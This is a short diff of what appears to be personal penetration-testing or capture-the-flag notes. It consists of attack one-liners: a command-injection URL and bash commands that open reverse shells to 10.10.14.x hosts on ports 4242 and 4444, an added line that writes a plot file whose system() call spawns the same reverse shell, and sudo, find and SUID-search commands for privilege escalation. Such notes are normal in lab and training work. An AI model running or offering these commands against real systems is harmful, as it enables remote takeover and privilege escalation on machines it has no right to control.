@@ -34,6 +34,8 @@ http://localhost.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.61/4242 
 
 bash -c "bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
 
+echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'\")" > file.plt
+
 Sudo -l
 find hacker -exec whoami \;
 find / -perm -u=s -type f 2>/dev/null
